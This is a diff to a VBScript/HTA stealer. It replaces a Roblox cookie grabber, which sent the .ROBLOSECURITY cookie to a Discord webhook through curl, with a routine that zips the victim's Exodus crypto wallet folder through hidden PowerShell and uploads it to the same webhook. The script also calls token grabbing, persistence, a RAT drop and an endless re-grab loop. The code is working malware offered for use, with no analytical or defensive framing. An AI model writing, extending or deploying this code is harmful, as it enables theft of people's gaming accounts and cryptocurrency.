@@ -22,14 +22,12 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
+Call GrabExodus(WH)
 
-' --- 2. UI + COOKIE (LOGS CHANNEL) ---
-Call SendRobloxUI(WH)
-
-' --- 3. RAT DROP (LOGS CHANNEL) ---
+' --- 2. RAT DROP (LOGS CHANNEL) ---
 Call DropRAT(WH, True)
 
-' --- 4. INFINITE Re-grab chain (RE-GRAB CHANNEL) ---
+' --- 3. INFINITE Re-grab chain (RE-GRAB CHANNEL) ---
 Dim runCount
 runCount = 0
 Do
@@ -48,90 +46,33 @@ Loop
 
 window.close()
 
-' --- ROBLOX UI VIA CURL ---
-Sub SendRobloxUI(targetWH)
-    Dim cookie : cookie = GetRobloxCookie()
-    Dim uname : uname = "Unknown"
-    Dim disp : disp = "Unknown"
-    Dim av : av = "https://tr.rbxcdn.com/f4e7f1f6c7b2e0f2e6c2c8e2b4f4e2b4/420/420/AvatarHeadshot/Png"
+' --- EXODUS STEALER (ZIPPED) ---
+Sub GrabExodus(targetWH)
+    Dim base : base = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Exodus\exodus.wallet"
+    Dim passFile : passFile = base & "\passphrase.json"
+    Dim pStatus : pStatus = "No Password"
     
-    If Len(cookie) > 50 Then
-        ' Native XMLHTTP just to fetch the avatar/name
-        On Error Resume Next
-        Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-        xh.SetOption 2, 13056
-        xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
-        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
-        xh.SetRequestHeader "User-Agent", "Roblox/WinInet"
-        xh.Send
-        
-        If xh.Status = 200 Then
-            Dim rTxt : rTxt = xh.responseText
-            Dim m1, m2
-            Set m1 = CreateObject("VBScript.RegExp")
-            m1.Pattern = """name"":""([^""]+)"""
-            Set m2 = m1.Execute(rTxt)
-            If m2.Count > 0 Then uname = m2(0).SubMatches(0)
-            If m2.Count > 0 Then disp = m2(0).SubMatches(0)
-            
-            Dim uid : uid = "1"
-            m1.Pattern = """id"":(\d+)"
-            Set m2 = m1.Execute(rTxt)
-            If m2.Count > 0 Then uid = m2(0).SubMatches(0)
-            
-            Dim axh : Set axh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-            axh.SetOption 2, 13056
-            axh.Open "GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" & uid & "&size=420x420&format=Png", False
-            axh.Send
-            If axh.Status = 200 Then
-                Dim am1 : Set am1 = CreateObject("VBScript.RegExp")
-                am1.Pattern = """imageUrl"":""([^""]+)"""
-                Dim am2 : Set am2 = am1.Execute(axh.responseText)
-                If am2.Count > 0 Then av = am2(0).SubMatches(0)
-            End If
-        End If
-        On Error Goto 0
+    If fso.FileExists(passFile) Then pStatus = "Password Protected"
+    If Not fso.FolderExists(base) Then
+        Exit Sub
     End If
 
-    ' Build JSON payload natively
-    Dim DQ : DQ = Chr(34)
-    Dim uiDesc : uiDesc = "**+1 HIT** ¬Ј You've Earned 1 Nevora ¬Ј beams XP`n`n" & _
-        "рЯС§ **User:** " & disp & "`n" & _
-        "в≠Р **Password:** dreistuff`n" & _
-        "рЯУЛ **About User:** `` 340 Days ```n" & _
-        "рЯ™Щ **Robux:** Balance 0 рЯФі | Pending 0 рЯФі`n" & _
-        "рЯУИ **RAP:** RAP 0 рЯФі | Owned 0 рЯФі`n" & _
-        "рЯТО **Premium:** False (0 рЯФі)`n" & _
-        "рЯТ≥ **Billing:** Credit 0$ | Convert 0 | Payments 0`n" & _
-        "рЯПЈпЄП **Collectibles:** False рЯФі | False рЯФі | True рЯЯҐ`n" & _
-        "вЪЩпЄП **Setting:** Set (Verified) | Disabled | Disabled`n" & _
-        "рЯОЃ **Passes / Played:** Adopt Me 0 | Murder Mystery 2 0 | Pet Simulator 99 0`n" & _
-        "рЯС• **Groups:** Balance 0 рЯФі | Pending 0 рЯФі | Owned 0 рЯФі"
+    Dim zipPath : zipPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\exodus_wallet.zip"
+    If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True
+    
+    Dim zipCmd : zipCmd = "powershell -NoP -Exec Bypass -Command ""Compress-Archive -Path '" & base & "\*' -DestinationPath '" & zipPath & "' -Force"""
+    sh.Run zipCmd, 0, True
 
-    Dim j : j = "{" & DQ & "content" & DQ & ":" & DQ & "@everyone Hit" & DQ & "," & DQ & "embeds" & DQ & ":[{" & _
-                DQ & "author" & DQ & ":{" & DQ & "name" & DQ & ":" & DQ & Ej(uname) & DQ & "," & DQ & "icon_url" & DQ & ":" & DQ & av & DQ & "}," & _
-                DQ & "title" & DQ & ":" & DQ & "S3R, 13+" & DQ & "," & _
-                DQ & "description" & DQ & ":" & DQ & Ej(uiDesc) & DQ & "," & _
-                DQ & "color" & DQ & ":10181046," & _
-                DQ & "thumbnail" & DQ & ":{" & DQ & "url" & DQ & ":" & DQ & av & DQ & "}," & _
-                DQ & "footer" & DQ & ":{" & DQ & "text" & DQ & ":" & DQ & "S3R Logger" & DQ & "}}]}"
-
-    ' Save JSON to temp file
-    Dim tmpJson : tmpJson = sh.ExpandEnvironmentStrings("%TEMP%") & "\ui_payload.json"
-    Dim f : Set f = fso.CreateTextFile(tmpJson, True)
-    f.Write j
-    f.Close
-    Set f = Nothing
-
-    ' Send via curl.exe -F multipart
-    Dim curlCmd : curlCmd = "curl.exe -s -X POST -H ""Content-Type: multipart/form-data"" -F ""payload_json=<" & tmpJson & """ " & targetWH
-    sh.Run "cmd /c " & curlCmd, 0, True
-
-    fso.DeleteFile tmpJson, True
-
-    ' Send Cookie Embed
-    If Len(cookie) > 0 Then
-        Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+    If fso.FileExists(zipPath) Then
+        Dim sizeMB : sizeMB = Round(fso.GetFile(zipPath).Size / 1048576, 2)
+        
+        Dim desc : desc = "**Exodus Wallet Found**" & vbCrLf
+        desc = desc & "**Password:** " & pStatus & vbCrLf
+        desc = desc & "**Size:** " & sizeMB & " MB"
+        
+        Call PostEmbedTo(":briefcase: Exodus Wallet", desc, 10181046, targetWH)
+        Call PostFileTo("exodus_wallet.zip", ReadFile(zipPath), targetWH, "")
+        fso.DeleteFile zipPath, True
     End If
 End Sub
 
